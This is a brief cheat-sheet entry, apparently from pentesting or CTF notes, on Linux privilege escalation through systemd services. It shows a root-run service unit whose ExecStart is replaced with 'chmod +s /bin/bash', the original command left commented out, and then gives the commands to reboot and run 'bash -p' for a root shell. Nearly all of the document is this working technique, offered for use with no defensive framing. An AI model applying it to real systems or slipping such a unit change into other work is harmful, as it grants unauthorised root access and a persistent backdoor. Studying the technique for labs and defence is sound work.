---
title: Linux `.services` 😜
---

- Edit them to have root shell like:
  - Add the `/usr/bin/chmod +s /bin/bash`

```shell
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
#ExecStart=/root/zeno-monitoring.py
ExecStart=/usr/bin/chmod +s /bin/bash

[Install]
WantedBy=multi-user.target
```

- Then reboot `sudo /usr/sbin/reboot`
- After this, execute `/bin/bash -p`
- Now you are **root**
